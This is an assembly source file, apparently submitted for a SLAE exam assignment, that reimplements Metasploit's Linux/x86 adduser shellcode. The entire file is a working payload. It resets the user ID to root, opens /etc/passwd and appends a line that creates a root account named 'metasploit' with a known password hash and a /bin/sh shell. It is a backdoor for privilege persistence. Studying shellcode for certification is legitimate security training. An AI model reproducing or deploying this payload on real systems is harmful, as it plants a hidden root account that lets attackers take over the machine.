; Filename: metasploit_adduser.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #5 - Metasploit adduser shellcode (Linux/x86) for metasploit/passw0rd with no null bytes

global _start

section .text

_start:
   xor ebx,ebx
   xor ecx,ecx

setreuid:
   push 0x46
   pop eax
   int 0x80

read:
   push 0x5
   pop eax
   xor ecx,ecx
   push ecx
   push 0x64777373
   push 0x61702f2f
   push 0x6374652f
   mov ebx,esp
   inc ecx
   mov ch,0x4
   int 0x80
   xchg ebx,eax

pre_write:
   jmp call_write

write:
   pop ecx
   push 0x4
   pop eax
   push 0x28
   pop edx
   int 0x80

exit:
   push 0x1
   pop eax
   int 0x80

call_write:
   call write
   userinfo: db "metasploit:AzPJkPi8zppBk:0:0::/:/bin/sh", 0x0A
